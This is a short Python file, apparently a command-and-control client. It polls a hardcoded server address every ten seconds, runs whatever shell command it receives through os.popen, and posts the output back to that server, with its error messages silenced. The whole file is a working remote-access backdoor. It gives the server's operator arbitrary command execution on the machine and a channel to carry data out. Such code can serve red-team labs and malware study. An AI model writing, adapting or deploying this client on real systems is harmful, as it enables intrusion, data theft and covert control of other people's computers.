# c2_client.py
import requests
import time
import os

SERVER_URL = "http://100.64.4.223:5000"

def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/command")
        command = response.json().get('command', '')
        return command
    except Exception as e:
        #print(f"Error fetching command: {e}")
        return ""

def send_result(result):
    try:
        response = requests.post(f"{SERVER_URL}/result", json={'result': result})
        return response.json().get('status', '')
    except Exception as e:
        #print(f"Error sending result: {e}")
        pass

def execute_command(command):
    if command == "":
        return "No command received."
    
    try:
        # Execute the command and get output
        output = os.popen(command).read()
        return output if output else "Command executed with no output."
    except Exception as e:
        return f"Error executing command: {e}"

if __name__ == "__main__":
    while True:
        command = get_command()
        if command:
            #print(f"Received command: {command}")
            result = execute_command(command)
            #print(f"Command result: {result}")
            send_result(result)
        time.sleep(10)  # Check every 10 seconds
